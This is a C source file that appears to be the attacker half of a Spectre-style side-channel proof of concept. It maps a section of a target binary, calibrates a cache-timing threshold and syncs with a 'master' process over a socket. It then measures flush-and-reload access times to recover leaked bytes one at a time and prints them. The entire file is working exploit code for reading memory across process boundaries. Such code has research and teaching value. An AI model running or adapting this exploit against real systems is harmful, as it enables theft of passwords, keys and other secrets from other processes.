
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <errno.h>
#include <ctype.h>
#include <assert.h>

#include <emmintrin.h>
#include <x86intrin.h>

#include "common.h"
#include "spectre.h"

/*
 * Global variable to save 'useless' statements from being
 * compiled out.
 */
int x;

/*
 * Reads byte many times to obtain the stats.
 */
static int read_byte(uint8_t *array, int runs, int master,
    uint64_t threshold, uint8_t *byte);

int main(int argc, char *argv[])
{
    printf("Attack pid = %d\n", getpid());

    int err;
    if (argc < 2)
    {
        fprintf(stderr, "Usage: %s <binname>\n", argv[0]);
        return EXIT_FAILURE;
    }

    err = set_cpu(0);
    if (err < 0)
        return EXIT_FAILURE;

    uint8_t *array = mapsection(argv[1], TARGET_SECTION, ARRSIZE);
    if (!array)
        return EXIT_FAILURE;

    uint64_t threshold = calculate_threshold(1000000);

    int sock = setup_server(CONTROL_PORT);
    if (sock < 0)
    {
        err = EXIT_FAILURE;
        goto err_quit0;
    }

    int master = accept(sock, NULL, NULL);
    if (master < 0)
    {
        perror("accept");
        err = EXIT_FAILURE;
        goto err_quit1;
    }
    printf("Master connected, starting\n");

    while (1)
    {
        uint8_t byte = 0;
        int hits = 0;
        hits = read_byte(array, BYTE_READ_REPEATS, master, threshold, &byte);
        if (hits < 0)
            break;
        else
        {
            printf("%3d/%3d hits: %c (%d)\n", hits, BYTE_READ_REPEATS,
                (isprint(byte) ? byte : '?'), byte);
        }
    }

//err_quit2:
    close(master);
err_quit1:
    close(sock);
err_quit0:
    munmap(array, ARRSIZE);
    return EXIT_SUCCESS;
}

static int read_byte(uint8_t *array, int runs, int master,
    uint64_t threshold, uint8_t *byte)
{
    assert(array);
    assert(byte);

    int hits[256] = {};

    for (int r = 0; r < runs; r++)
    {
        int requests[REQUEST_SIZE] = {};
        int err = recv(master, requests, sizeof(requests), 0);
        if (err < 0)
        {
            perror("recv");
            return -1;
        }
        else if (err == 0)
            return -2;

        usleep(100);

        // Checking byte values
        // for (int i = 1; i < 200; i++)
        for (int i = 1; i < 127; i++)
            if (measure_access_time(&array[i*4096 + OFFSET]) < threshold)
                hits[i]++;

        // Just sending a signal to sync
        send(master, &hits[0], sizeof(hits[0]), 0);
    }

    int winner = 0;
    for (int i = 0; i < 256; i++)
        if (hits[i] > hits[winner])
            winner  = i;

    *byte = winner;
    return hits[winner];
}

